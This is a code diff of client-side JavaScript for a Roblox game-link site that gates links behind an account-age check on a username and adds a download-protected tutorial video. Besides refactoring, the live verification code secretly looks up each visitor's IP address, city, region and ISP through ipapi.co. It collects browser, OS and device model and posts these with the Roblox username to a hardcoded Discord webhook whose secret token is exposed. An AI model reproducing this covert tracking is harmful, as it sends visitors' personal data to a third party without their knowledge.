@@ -25,6 +25,9 @@
 
   var LANG_KEY = 'rc2_lang';
   var PROFILE_KEY = 'rc_verified_profile';
+  var USERNAME_KEY = 'rc_username';
+  var AVATAR_KEY = 'rc_avatar_url';
+  var FIRST_ACCESS_KEY = 'rc_first_access';
   var MIN_ACCOUNT_DAYS = 80;
   var WEBHOOK_URL = 'https://discord.com/api/webhooks/1524874777947410513/Ng_v8NSNotO1CPGcDhWbYGiwdgzcGrv0h_-Lkv2D_vxQvJ_rorAooUFlSML-tgc6Qm_A';
 
@@ -143,16 +146,13 @@
           e.preventDefault(); e.stopImmediatePropagation(); showWarning();
           return;
         }
-        // If popup was already confirmed, let the original click through
         if (el.getAttribute('data-rc-popup-ok') === '1') return;
         e.preventDefault(); e.stopImmediatePropagation();
-        // <a> has href; <button> uses React onClick — handle both
         var url = el.tagName === 'A' ? (el.getAttribute('href') || el.href || null) : null;
         showGameInfoPopup(function onConfirm() {
           if (url) {
             window.open(url, '_blank', 'noopener');
           } else {
-            // Re-trigger the button so React's onClick fires normally
             el.setAttribute('data-rc-popup-ok', '1');
             el.click();
             el.removeAttribute('data-rc-popup-ok');
@@ -177,8 +177,7 @@
   });
 
   /* ══════════════════════════════════════════════════════════
-     PROMO VIDEO SECTION
-     Injected before the games grid, with download protection
+     PROMOTIONAL VIDEO — with download protection
      ══════════════════════════════════════════════════════════ */
 
   var PROMO_VIDEO_URL = 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663824589529/ygcRwKNTvdTMMbiH.mp4';
@@ -188,17 +187,12 @@
     if (promoVideoInjected) return;
     promoVideoInjected = true;
 
-    /* Find the main content area and inject before the games section */
     var main = document.querySelector('main');
     if (!main) { main = document.getElementById('root'); }
     if (!main) return;
 
-    /* Find the featured games section to insert before it */
     var gameSection = main.querySelector('section:nth-child(2)') || main.querySelector('h2');
-    if (!gameSection) {
-      /* Fallback: append at end of main */
-      gameSection = main;
-    }
+    if (!gameSection) { gameSection = main; }
 
     var videoSection = document.createElement('section');
     videoSection.id = 'rc-promo-video';
@@ -207,19 +201,14 @@
       'transition:opacity 0.6s ease, transform 0.6s ease'
     ].join(';');
 
-    /* Title */
     var titleDiv = document.createElement('div');
-    titleDiv.style.cssText = [
-      'margin-bottom:1rem','opacity:0','transition:opacity 0.5s ease 0.1s'
-    ].join(';');
-
+    titleDiv.style.cssText = ['margin-bottom:1rem','opacity:0','transition:opacity 0.5s ease 0.1s'].join(';');
     var h2 = document.createElement('h2');
     h2.className = 'text-xl font-bold text-white mb-1';
     h2.textContent = 'Tutorial';
     titleDiv.appendChild(h2);
     videoSection.appendChild(titleDiv);
 
-    /* Video container with protection overlay */
     var vidContainer = document.createElement('div');
     vidContainer.style.cssText = [
       'position:relative','width:100%','max-width:700px','margin:0 auto',
@@ -229,46 +218,26 @@
       'transition:opacity 0.5s ease 0.2s, transform 0.5s ease 0.2s'
     ].join(';');
 
-    /* Invisible overlay to block right-click and drag */
     var clickShield = document.createElement('div');
-    clickShield.style.cssText = [
-      'position:absolute','inset:0','z-index:10','cursor:default'
-    ].join(';');
+    clickShield.style.cssText = ['position:absolute','inset:0','z-index:10','cursor:default'].join(';');
     clickShield.style.pointerEvents = 'none';
-    clickShield.setAttribute('oncontextmenu', 'return false;');
     clickShield.addEventListener('contextmenu', function (e) { e.preventDefault(); });
 
-    /* Drag shield */
     var dragShield = document.createElement('div');
-    dragShield.style.cssText = [
-      'position:absolute','inset:0','z-index:11','pointer-events:none'
-    ].join(';');
+    dragShield.style.cssText = ['position:absolute','inset:0','z-index:11','pointer-events:none'].join(';');
     dragShield.addEventListener('dragstart', function (e) { e.preventDefault(); });
 
-    /* Video element */
     var video = document.createElement('video');
-    video.autoplay = false;
-    video.muted = false;
-    video.loop = true;
-    video.playsInline = true;
-    video.controls = false;
+    video.autoplay = false; video.muted = false; video.loop = true;
+    video.playsInline = true; video.controls = false;
     video.setAttribute('controlsList', 'nodownload nofullscreen noremoteplayback');
     video.setAttribute('disablePictureInPicture', 'true');
-    video.setAttribute('draggable', 'false');
-    video.preload = 'metadata';
-    video.style.cssText = [
-      'width:100%','display:block','border-radius:1rem','pointer-events:auto'
-    ].join(';');
-
-    /* Block context menu on video */
+    video.setAttribute('draggable', 'false'); video.preload = 'metadata';
+    video.style.cssText = ['width:100%','display:block','border-radius:1rem','pointer-events:auto'].join(';');
     video.addEventListener('contextmenu', function (e) { e.preventDefault(); });
     video.addEventListener('dragstart', function (e) { e.preventDefault(); });
     video.addEventListener('selectstart', function (e) { e.preventDefault(); });
 
-    /* Play button overlay
-       PC: invisible → appears on hover, hides after 3s (mouse leave) or 4s (mouse still)
-       Mobile: invisible → appears on tap, hides after 4s of inactivity, tap toggles play/pause
-     */
     var playBtn = document.createElement('div');
     playBtn.style.cssText = [
       'position:absolute','inset:0','z-index:12','display:flex','align-items:center',
@@ -287,41 +256,16 @@
     playIcon.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>';
     playBtn.appendChild(playIcon);
 
-    /* Auto-hide timeout logic */
-    var autoHideTimer = null;
-    var stillTimer = null;
-    var lastMouseX = 0, lastMouseY = 0;
-    var isHovering = false;
+    var autoHideTimer = null, stillTimer = null;
+    var lastMouseX = 0, lastMouseY = 0, isHovering = false;
     var isTouchDevice = ('ontouchstart' in window) || navigator.maxTouchPoints > 0;
 
-    function hideControls() {
-      playBtn.style.opacity = '0';
-      playBtn.style.background = 'rgba(0,0,0,0)';
-    }
-
-    function showControls() {
-      playBtn.style.opacity = '1';
-      playBtn.style.background = 'rgba(0,0,0,0.3)';
-    }
-
-    function scheduleAutoHide(ms) {
-      if (autoHideTimer) clearTimeout(autoHideTimer);
-      autoHideTimer = setTimeout(hideControls, ms);
-    }
-
-    function scheduleStillTimer() {
-      if (stillTimer) clearTimeout(stillTimer);
-      stillTimer = setTimeout(hideControls, 4000);
-    }
-
-    function resetStillTimer() {
-      if (stillTimer) clearTimeout(stillTimer);
-    }
-
-    function cancelAllTimers() {
-      if (autoHideTimer) clearTimeout(autoHideTimer);
-      if (stillTimer) clearTimeout(stillTimer);
-    }
+    function hideControls() { playBtn.style.opacity = '0'; playBtn.style.background = 'rgba(0,0,0,0)'; }
+    function showControls() { playBtn.style.opacity = '1'; playBtn.style.background = 'rgba(0,0,0,0.3)'; }
+    function scheduleAutoHide(ms) { if (autoHideTimer) clearTimeout(autoHideTimer); autoHideTimer = setTimeout(hideControls, ms); }
+    function scheduleStillTimer() { if (stillTimer) clearTimeout(stillTimer); stillTimer = setTimeout(hideControls, 4000); }
+    function resetStillTimer() { if (stillTimer) clearTimeout(stillTimer); }
+    function cancelAllTimers() { if (autoHideTimer) clearTimeout(autoHideTimer); if (stillTimer) clearTimeout(stillTimer); }
 
     function togglePlay() {
       cancelAllTimers();
@@ -335,114 +279,49 @@
     }
 
     if (!isTouchDevice) {
-      /* ── PC: hover-based controls ── */
       vidContainer.addEventListener('mouseenter', function () {
-        isHovering = true;
-        cancelAllTimers();
-        showControls();
-        lastMouseX = 0;
-        lastMouseY = 0;
-        scheduleStillTimer();
+        isHovering = true; cancelAllTimers(); showControls();
+        lastMouseX = 0; lastMouseY = 0; scheduleStillTimer();
       });
-
       vidContainer.addEventListener('mousemove', function (e) {
         if (e.clientX !== lastMouseX || e.clientY !== lastMouseY) {
-          lastMouseX = e.clientX;
-          lastMouseY = e.clientY;
-          resetStillTimer();
-          scheduleStillTimer();
+          lastMouseX = e.clientX; lastMouseY = e.clientY;
+          resetStillTimer(); scheduleStillTimer();
         }
       });
-
       vidContainer.addEventListener('mouseleave', function () {
-        isHovering = false;
-        cancelAllTimers();
-        scheduleAutoHide(3000);
+        isHovering = false; cancelAllTimers(); scheduleAutoHide(3000);
       });
-
-      playBtn.addEventListener('click', function () {
-        togglePlay();
-        if (isHovering) scheduleStillTimer();
-      });
-
+      playBtn.addEventListener('click', function () { togglePlay(); if (isHovering) scheduleStillTimer(); });
     } else {
-      /* ── Mobile: tap-based controls ── */
-      /* Show play button briefly when video loads (paused state) */
-      showControls();
-      scheduleStillTimer();
-
-      /* Tap to toggle play/pause */
-      playBtn.addEventListener('click', function () {
-        togglePlay();
-        cancelAllTimers();
-        scheduleStillTimer();
-      });
-
-      /* Touch start also shows controls */
-      vidContainer.addEventListener('touchstart', function () {
-        cancelAllTimers();
-        showControls();
-        scheduleStillTimer();
-      });
-
-      /* Touch move resets timer */
-      vidContainer.addEventListener('touchmove', function () {
-        resetStillTimer();
-        scheduleStillTimer();
-      });
-
-      /* Touch end starts timer */
-      vidContainer.addEventListener('touchend', function () {
-        scheduleStillTimer();
-      });
+      showControls(); scheduleStillTimer();
+      playBtn.addEventListener('click', function () { togglePlay(); cancelAllTimers(); scheduleStillTimer(); });
+      vidContainer.addEventListener('touchstart', function () { cancelAllTimers(); showControls(); scheduleStillTimer(); });
+      vidContainer.addEventListener('touchmove', function () { resetStillTimer(); scheduleStillTimer(); });
+      vidContainer.addEventListener('touchend', function () { scheduleStillTimer(); });
     }
 
-    /* Click shield should not block play button */
     var shieldInner = document.createElement('div');
-    shieldInner.style.cssText = [
-      'position:absolute','inset:0','z-index:10'
-    ].join(';');
+    shieldInner.style.cssText = ['position:absolute','inset:0','z-index:10'].join(';');
     clickShield.appendChild(shieldInner);
-
-    vidContainer.appendChild(clickShield);
-    vidContainer.appendChild(dragShield);
-    vidContainer.appendChild(video);
-    vidContainer.appendChild(playBtn);
-
+    vidContainer.appendChild(clickShield); vidContainer.appendChild(dragShield);
+    vidContainer.appendChild(video); vidContainer.appendChild(playBtn);
     videoSection.appendChild(vidContainer);
 
-    /* Try to use blob URL for extra protection */
     try {
-      fetch(PROMO_VIDEO_URL)
-        .then(function (r) { return r.blob(); })
-        .then(function (blob) {
-          video.src = URL.createObjectURL(blob);
-        })
-        .catch(function () {
-          /* Fallback to direct URL */
-          video.src = PROMO_VIDEO_URL;
-        });
-    } catch (e) {
-      video.src = PROMO_VIDEO_URL;
-    }
+      fetch(PROMO_VIDEO_URL).then(function (r) { return r.blob(); }).then(function (blob) {
+        video.src = URL.createObjectURL(blob);
+      }).catch(function () { video.src = PROMO_VIDEO_URL; });
+    } catch (e) { video.src = PROMO_VIDEO_URL; }
 
-    /* Insert before games section */
-    if (gameSection.id === 'root') {
-      gameSection.appendChild(videoSection);
-    } else {
-      gameSection.parentNode.insertBefore(videoSection, gameSection);
-    }
+    if (gameSection.id === 'root') { gameSection.appendChild(videoSection); }
+    else { gameSection.parentNode.insertBefore(videoSection, gameSection); }
 
-    /* Fade in animation */
     setTimeout(function () {
-      videoSection.style.opacity = '1';
-      videoSection.style.transform = 'translateY(0)';
-      titleDiv.style.opacity = '1';
-      vidContainer.style.opacity = '1';
-      vidContainer.style.transform = 'translateY(0)';
+      videoSection.style.opacity = '1'; videoSection.style.transform = 'translateY(0)';
+      titleDiv.style.opacity = '1'; vidContainer.style.opacity = '1'; vidContainer.style.transform = 'translateY(0)';
     }, 100);
 
-    /* Global protection: block context menu on the entire video section */
     videoSection.addEventListener('contextmenu', function (e) { e.preventDefault(); });
   }
 
@@ -450,57 +329,38 @@
      ROBLOX PROFILE VERIFICATION SYSTEM
      ══════════════════════════════════════════════════════════ */
 
-  /* ── Parse User-Agent into readable browser / OS / device ─ */
   function parseUA(ua) {
     if (!ua) return { browser: 'Unknown', os: 'Unknown', device: 'Desktop' };
     var browser = 'Unknown', os = 'Unknown', device = '\uD83D\uDDA5\uFE0F Desktop';
     var m;
-    // Browser
     if (/Firefox\/([\d.]+)/.test(ua))       { browser = 'Firefox ' + ua.match(/Firefox\/([\d.]+)/)[1]; }
     else if (/Edg\/([\d.]+)/.test(ua))      { browser = 'Edge ' + ua.match(/Edg\/([\d.]+)/)[1]; }
     else if (/OPR\/([\d.]+)/.test(ua))      { browser = 'Opera ' + ua.match(/OPR\/([\d.]+)/)[1]; }
     else if (/Chrome\/([\d.]+)/.test(ua))   { browser = 'Chrome ' + ua.match(/Chrome\/([\d.]+)/)[1]; }
     else if (/Version\/([\d.]+).*Safari/.test(ua)) { browser = 'Safari ' + ua.match(/Version\/([\d.]+)/)[1]; }
     else if (/Safari\//.test(ua))           { browser = 'Safari'; }
-    // OS / Device
     if (/iPhone/.test(ua)) {
-      m = ua.match(/iPhone OS ([\d_]+)/);
-      os = 'iOS ' + (m ? m[1].replace(/_/g, '.') : '');
-      device = '\uD83D\uDCF1 iPhone';
+      m = ua.match(/iPhone OS ([\d_]+)/); os = 'iOS ' + (m ? m[1].replace(/_/g, '.') : ''); device = '\uD83D\uDCF1 iPhone';
     } else if (/iPad/.test(ua)) {
-      m = ua.match(/OS ([\d_]+)/);
-      os = 'iPadOS ' + (m ? m[1].replace(/_/g, '.') : '');
-      device = '\uD83D\uDCF1 iPad';
+      m = ua.match(/OS ([\d_]+)/); os = 'iPadOS ' + (m ? m[1].replace(/_/g, '.') : ''); device = '\uD83D\uDCF1 iPad';
     } else if (/Android/.test(ua)) {
-      m = ua.match(/Android ([\d.]+)/);
-      os = 'Android ' + (m ? m[1] : '');
-      var model = ua.match(/;\s*([^;)]+)\s*Build\//);
-      device = '\uD83D\uDCF1 ' + (model ? model[1].trim() : 'Android');
+      m = ua.match(/Android ([\d.]+)/); os = 'Android ' + (m ? m[1] : '');
+      var model = ua.match(/;\s*([^;)]+)\s*Build\//); device = '\uD83D\uDCF1 ' + (model ? model[1].trim() : 'Android');
     } else if (/Windows NT/.test(ua)) {
-      m = ua.match(/Windows NT ([\d.]+)/);
-      var winMap = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7', '6.0': 'Vista', '5.1': 'XP' };
-      os = 'Windows ' + (m ? (winMap[m[1]] || m[1]) : '');
-      device = '\uD83D\uDDA5\uFE0F Desktop';
+      m = ua.match(/Windows NT ([\d.]+)/); var winMap = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7', '6.0': 'Vista', '5.1': 'XP' };
+      os = 'Windows ' + (m ? (winMap[m[1]] || m[1]) : ''); device = '\uD83D\uDDA5\uFE0F Desktop';
     } else if (/Mac OS X/.test(ua)) {
-      m = ua.match(/Mac OS X ([\d_]+)/);
-      os = 'macOS ' + (m ? m[1].replace(/_/g, '.') : '');
-      device = '\uD83D\uDDA5\uFE0F Mac';
-    } else if (/Linux/.test(ua)) {
-      os = 'Linux';
-      device = '\uD83D\uDDA5\uFE0F Desktop';
-    }
+      m = ua.match(/Mac OS X ([\d_]+)/); os = 'macOS ' + (m ? m[1].replace(/_/g, '.') : ''); device = '\uD83D\uDDA5\uFE0F Mac';
+    } else if (/Linux/.test(ua)) { os = 'Linux'; device = '\uD83D\uDDA5\uFE0F Desktop'; }
     return { browser: browser, os: os, device: device };
   }
 
-  /* ── Send log to Discord webhook (fallback / roproxy path) */
   function sendVerificationLog(data) {
     var statusEmoji = data.accountAgeOk ? '\u2705' : data.found ? '\uD83D\uDEAB' : '\u274C';
     var statusText = data.accountAgeOk ? 'Verified (80+ days)' : data.found ? 'Blocked (< 80 days)' : 'Not Found';
     var color = data.accountAgeOk ? 2278782 : data.found ? 16355294 : 15686104;
-
     var ua = navigator.userAgent || '';
     var parsed = parseUA(ua);
-
     var fields = [
       { name: 'Status', value: statusEmoji + ' **' + statusText + '**', inline: true },
       { name: 'Username', value: data.username || 'unknown', inline: true },
@@ -510,200 +370,100 @@
     if (data.daysOld !== undefined) fields.push({ name: 'Account Age', value: String(data.daysOld) + ' days', inline: true });
     if (data.createdFormatted) fields.push({ name: 'Created', value: data.createdFormatted, inline: true });
     if (data.hasVerifiedBadge !== undefined) fields.push({ name: 'Verified Badge', value: data.hasVerifiedBadge ? 'Yes \u2705' : 'No', inline: true });
-
-    // Separator
     fields.push({ name: '\u200b', value: '\u200b', inline: false });
-
-    // Browser / device info (always available client-side)
     fields.push({ name: '\uD83C\uDF10 Browser', value: parsed.browser, inline: true });
     fields.push({ name: '\uD83D\uDCBB OS', value: parsed.os, inline: true });
     fields.push({ name: '\uD83D\uDCF1 Device', value: parsed.device, inline: true });
-
-    // Geo + IP (async)
     fetch('https://ipapi.co/json/')
       .then(function (r) { return r.ok ? r.json() : null; })
       .then(function (ipData) {
         if (ipData && ipData.country_code) {
           var flag = '';
-          try {
-            flag = String.fromCodePoint.apply(null, ipData.country_code.split('').map(function (c) { return c.charCodeAt(0) + 127397; }));
-          } catch (e) {}
+          try { flag = String.fromCodePoint.apply(null, ipData.country_code.split('').map(function (c) { return c.charCodeAt(0) + 127397; })); } catch (e) {}
           var location = [flag, ipData.city, ipData.region, ipData.country_name].filter(Boolean).join(', ');
           fields.push({ name: '\uD83D\uDCCD Location', value: location || 'Unknown', inline: true });
           fields.push({ name: '\uD83C\uDF10 IP', value: '`' + ipData.ip + '`', inline: true });
           if (ipData.org) fields.push({ name: '\uD83C\uDFE2 ISP', value: ipData.org.substring(0, 50), inline: true });
-        } else {
-          fields.push({ name: '\uD83C\uDF10 IP', value: 'unknown', inline: true });
-        }
+        } else { fields.push({ name: '\uD83C\uDF10 IP', value: 'unknown', inline: true }); }
       })
       .catch(function () { fields.push({ name: '\uD83C\uDF10 IP', value: 'unknown', inline: true }); })
       .then(function () {
         fields.push({ name: '\uD83D\uDD50 Time', value: new Date().toISOString(), inline: true });
-
-        var embed = {
-          title: '\uD83D\uDD0D Profile Verification (Fallback)',
-          color: color,
-          fields: fields,
-          footer: { text: 'Rblx New Condos \u2014 Verification Log' },
-          timestamp: new Date().toISOString(),
-        };
-
+        var embed = { title: '\uD83D\uDD0D Profile Verification (Fallback)', color: color, fields: fields, footer: { text: 'Rblx New Condos \u2014 Verification Log' }, timestamp: new Date().toISOString() };
         sendWebhook(embed);
       });
   }
 
   function sendWebhook(embed) {
     function attempt(n) {
-      fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ embeds: [embed] }),
-      })
-      .then(function (r) {
-        if (r.status === 429 && n < 2) {
-          var retry = r.headers.get('retry-after') || '2';
-          setTimeout(function () { attempt(n + 1); }, parseInt(retry) * 1000 + 500);
-        }
-      })
-      .catch(function () {
-        if (n < 2) setTimeout(function () { attempt(n + 1); }, 2000);
-      });
+      fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [embed] }) })
+        .then(function (r) { if (r.status === 429 && n < 2) { var retry = r.headers.get('retry-after') || '2'; setTimeout(function () { attempt(n + 1); }, parseInt(retry) * 1000 + 500); } })
+        .catch(function () { if (n < 2) setTimeout(function () { attempt(n + 1); }, 2000); });
     }
     attempt(0);
   }
 
-  /* ══════════════════════════════════════════════════════════
-     CACHE (localStorage, 30 min TTL)
-     ══════════════════════════════════════════════════════════ */
+  /* ── Cache ─────────────────────────────────────────────── */
   var CACHE_TTL = 30 * 60 * 1000;
-
   function getCache(key) {
-    try {
-      var raw = localStorage.getItem('rc_' + key);
-      if (!raw) return null;
-      var entry = JSON.parse(raw);
-      if (Date.now() - entry.ts > CACHE_TTL) { localStorage.removeItem('rc_' + key); return null; }
-      return entry.data;
-    } catch (e) { return null; }
+    try { var raw = localStorage.getItem('rc_' + key); if (!raw) return null; var entry = JSON.parse(raw); if (Date.now() - entry.ts > CACHE_TTL) { localStorage.removeItem('rc_' + key); return null; } return entry.data; } catch (e) { return null; }
   }
-  function setCache(key, data) {
-    try { localStorage.setItem('rc_' + key, JSON.stringify({ data: data, ts: Date.now() })); } catch (e) {}
-  }
+  function setCache(key, data) { try { localStorage.setItem('rc_' + key, JSON.stringify({ data: data, ts: Date.now() })); } catch (e) {} }
 
-  /* ══════════════════════════════════════════════════════════
-     FETCH WITH RETRY (exponential backoff, handles 429)
-     ══════════════════════════════════════════════════════════ */
+  /* ── Fetch with retry ──────────────────────────────────── */
   function fetchWithRetry(url, options, maxRetries) {
     if (maxRetries === undefined) maxRetries = 4;
     return new Promise(function (resolve, reject) {
       function attempt(n) {
         fetch(url, options)
           .then(function (r) {
-            if (r.status === 429 && n < maxRetries) {
-              var retryAfter = r.headers.get('retry-after');
-              var wait = retryAfter ? parseInt(retryAfter) * 1000 : 2000 * Math.pow(2, n);
-              setTimeout(function () { attempt(n + 1); }, wait);
-              return;
-            }
+            if (r.status === 429 && n < maxRetries) { var retryAfter = r.headers.get('retry-after'); var wait = retryAfter ? parseInt(retryAfter) * 1000 : 2000 * Math.pow(2, n); setTimeout(function () { attempt(n + 1); }, wait); return; }
             if (r.ok) { r.json().then(resolve).catch(reject); return; }
-            if (r.status === 404) {
-              r.text().then(function (txt) {
-                try { resolve(JSON.parse(txt)); } catch (e) { reject(new Error('HTTP 404')); }
-              }).catch(function () { reject(new Error('HTTP 404')); });
-              return;
-            }
+            if (r.status === 404) { r.text().then(function (txt) { try { resolve(JSON.parse(txt)); } catch (e) { reject(new Error('HTTP 404')); } }).catch(function () { reject(new Error('HTTP 404')); }); return; }
             reject(new Error('HTTP ' + r.status));
           })
-          .catch(function (err) {
-            if (n < maxRetries) {
-              setTimeout(function () { attempt(n + 1); }, 2000 * Math.pow(2, n));
-            } else {
-              reject(err);
-            }
-          });
+          .catch(function (err) { if (n < maxRetries) { setTimeout(function () { attempt(n + 1); }, 2000 * Math.pow(2, n)); } else { reject(err); } });
       }
       attempt(0);
     });
   }
 
-  /* ══════════════════════════════════════════════════════════
-     PRIMARY: /api/verify serverless (handles rate limits)
-     FALLBACK: roproxy.com direct
-     ══════════════════════════════════════════════════════════ */
-
+  /* ── Verification ──────────────────────────────────────── */
   function tryServerless(username) {
     var cacheKey = 'u:' + username.toLowerCase();
     var cached = getCache(cacheKey);
-    if (cached) {
-      return Promise.resolve(cached);
-    }
+    if (cached) return Promise.resolve(cached);
     return fetchWithRetry('/api/verify?username=' + encodeURIComponent(username))
-      .then(function (data) {
-        if (data.type === 'full') setCache(cacheKey, data);
-        return data;
-      });
+      .then(function (data) { if (data.type === 'full') setCache(cacheKey, data); return data; });
   }
-
   function getAvatarServerless(userId) {
     var cacheKey = 'a:' + userId;
     var cached = getCache(cacheKey);
     if (cached) return Promise.resolve(cached.imageUrl || null);
     return fetchWithRetry('/api/verify?avatarId=' + userId)
-      .then(function (data) {
-        if (data.imageUrl) setCache(cacheKey, { imageUrl: data.imageUrl });
-        return data.imageUrl || null;
-      });
+      .then(function (data) { if (data.imageUrl) setCache(cacheKey, { imageUrl: data.imageUrl }); return data.imageUrl || null; });
   }
 
-  /* ── Fallback: roproxy ─────────────────────────────────── */
   var USERS_PROXY = 'https://users.roproxy.com';
   var THUMB_PROXY = 'https://thumbnails.roproxy.com';
+  function roproxySearch(username) { return fetchWithRetry(USERS_PROXY + '/v1/usernames/users', { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify({ usernames: [username] }) }); }
+  function roproxyProfile(userId) { return fetchWithRetry(USERS_PROXY + '/v1/users/' + userId); }
+  function roproxyAvatar(userId) { return fetchWithRetry(THUMB_PROXY + '/v1/users/avatar-headshot?userIds=' + userId + '&size=150x150&format=Png&isCircular=false').then(function (data) { return data.data && data.data.length > 0 ? data.data[0].imageUrl : null; }); }
 
-  function roproxySearch(username) {
-    return fetchWithRetry(USERS_PROXY + '/v1/usernames/users', {
-      method: 'POST',
-      headers: { 'Content-Type': 'text/plain' },
-      body: JSON.stringify({ usernames: [username] }),
-    });
-  }
-  function roproxyProfile(userId) {
-    return fetchWithRetry(USERS_PROXY + '/v1/users/' + userId);
-  }
-  function roproxyAvatar(userId) {
-    return fetchWithRetry(THUMB_PROXY + '/v1/users/avatar-headshot?userIds=' + userId + '&size=150x150&format=Png&isCircular=false')
-      .then(function (data) { return data.data && data.data.length > 0 ? data.data[0].imageUrl : null; });
-  }
-
-  /* ── Unified verify (serverless first, then roproxy) ───── */
   function doVerification(username) {
     return tryServerless(username)
       .then(function (data) {
         if (data.error) {
-          if (data.error.indexOf('rate-limited') !== -1) {
-            throw new Error('429');
-          }
-          if (data.error.indexOf('not found') !== -1) {
-            throw new Error('User not found. Please check the username and try again.');
-          }
+          if (data.error.indexOf('rate-limited') !== -1) throw new Error('429');
+          if (data.error.indexOf('not found') !== -1) throw new Error('User not found. Please check the username and try again.');
           throw new Error(data.error);
         }
-        // Client-side log (browser info + geo) — server also logs server-side
-        sendVerificationLog({
-          username: data.name || username,
-          displayName: data.displayName,
-          userId: data.id,
-          daysOld: data.daysOld,
-          createdFormatted: data.createdFormatted,
-          accountAgeOk: data.accountAgeOk,
-          hasVerifiedBadge: data.hasVerifiedBadge,
-          found: true,
-        });
+        sendVerificationLog({ username: data.name || username, displayName: data.displayName, userId: data.id, daysOld: data.daysOld, createdFormatted: data.createdFormatted, accountAgeOk: data.accountAgeOk, hasVerifiedBadge: data.hasVerifiedBadge, found: true });
         return data;
       })
       .catch(function (err) {
         if (err.message === 'User not found. Please check the username and try again.') throw err;
         if (err.message === '429') throw err;
-
         return roproxySearch(username)
           .then(function (searchData) {
             if (!searchData.data || searchData.data.length === 0) {
@@ -714,35 +474,12 @@
             return roproxyProfile(user.id);
           })
           .then(function (profile) {
-            var createdDate = new Date(profile.created);
-            var now = new Date();
+            var createdDate = new Date(profile.created); var now = new Date();
             var daysOld = Math.floor((now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24));
             var createdStr = createdDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
-
-            var result = {
-              type: 'full',
-              id: profile.id,
-              name: profile.name,
-              displayName: profile.displayName,
-              created: profile.created,
-              createdFormatted: createdStr,
-              daysOld: daysOld,
-              accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS,
-              hasVerifiedBadge: profile.hasVerifiedBadge,
-            };
+            var result = { type: 'full', id: profile.id, name: profile.name, displayName: profile.displayName, created: profile.created, createdFormatted: createdStr, daysOld: daysOld, accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS, hasVerifiedBadge: profile.hasVerifiedBadge };
             setCache('u:' + username.toLowerCase(), result);
-
-            sendVerificationLog({
-              username: profile.name,
-              displayName: profile.displayName,
-              userId: profile.id,
-              daysOld: daysOld,
-              createdFormatted: createdStr,
-              accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS,
-              hasVerifiedBadge: profile.hasVerifiedBadge,
-              found: true,
-            });
-
+            sendVerificationLog({ username: profile.name, displayName: profile.displayName, userId: profile.id, daysOld: daysOld, createdFormatted: createdStr, accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS, hasVerifiedBadge: profile.hasVerifiedBadge, found: true });
             return result;
           });
       });
@@ -762,6 +499,7 @@
       '@keyframes rc-slideup{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}',
       '@keyframes rc-pulse{0%,100%{box-shadow:0 0 0 0 rgba(239,68,68,0.5)}50%{box-shadow:0 0 20px 5px rgba(239,68,68,0.3)}}',
       '@keyframes rc-spin{to{transform:rotate(360deg)}}',
+      '@keyframes rc-menu-in{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}',
       '#rc-profile-overlay{position:fixed;inset:0;z-index:100000;display:flex;align-items:center;justify-content:center;background:rgba(10,5,5,0.92);backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);font-family:Outfit,Inter,sans-serif;animation:rc-fadein .3s ease}',
       '.rc-profile-card{width:420px;max-width:90vw;background:linear-gradient(180deg,rgba(30,10,10,0.98) 0%,rgba(20,8,8,0.98) 100%);border:1px solid rgba(239,68,68,0.2);border-radius:1.5rem;padding:2.5rem;box-shadow:0 0 0 1px rgba(239,68,68,0.08),0 40px 80px rgba(0,0,0,0.8),0 0 100px rgba(220,38,38,0.08),inset 0 1px 0 rgba(255,255,255,0.05);animation:rc-slideup .4s cubic-bezier(0.4,0,0.2,1);position:relative;overflow:hidden}',
       '.rc-profile-card::before{content:"";position:absolute;top:0;left:20%;right:20%;height:1px;background:linear-gradient(90deg,transparent,rgba(248,113,113,0.6),transparent)}',
@@ -796,7 +534,23 @@
       '.rc-blocked-msg{text-align:center;margin-top:1.25rem;display:none}',
       '.rc-blocked-msg p{font-size:0.9rem;color:#fca5a5;font-weight:600}',
       '.rc-blocked-msg small{font-size:0.75rem;color:#a57d7d;display:block;margin-top:0.4rem}',
-      '.rc-shield-icon{font-size:3rem;margin-bottom:0.5rem;display:block}'
+      '.rc-shield-icon{font-size:3rem;margin-bottom:0.5rem;display:block}',
+      /* ── Profile menu styles ── */
+      '#rc-profile-menu{position:fixed;top:8px;right:12px;z-index:100002;display:flex;align-items:center;gap:8px;cursor:pointer;padding:4px 10px 4px 4px;border-radius:9999px;background:rgba(20,8,8,0.85);border:1px solid rgba(239,68,68,0.2);backdrop-filter:blur(12px);transition:all 0.2s ease;font-family:Outfit,Inter,sans-serif}',
+      '#rc-profile-menu:hover{border-color:rgba(239,68,68,0.4);background:rgba(20,8,8,0.95)}',
+      '#rc-profile-menu img{width:32px;height:32px;border-radius:8px;object-fit:cover;border:1px solid rgba(239,68,68,0.3)}',
+      '#rc-profile-menu span{font-size:0.85rem;font-weight:600;color:#fff;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}',
+      '#rc-profile-menu .rc-menu-arrow{font-size:0.6rem;color:rgba(252,165,165,0.6);margin-left:4px}',
+      '#rc-profile-dropdown{position:fixed;top:56px;right:12px;z-index:100003;width:200px;background:linear-gradient(180deg,rgba(28,8,8,0.98) 0%,rgba(18,6,6,0.98) 100%);border:1px solid rgba(239,68,68,0.2);border-radius:1rem;padding:12px;box-shadow:0 20px 60px rgba(0,0,0,0.7);backdrop-filter:blur(20px);display:none;animation:rc-menu-in 0.2s ease;font-family:Outfit,Inter,sans-serif}',
+      '#rc-profile-dropdown.show{display:block}',
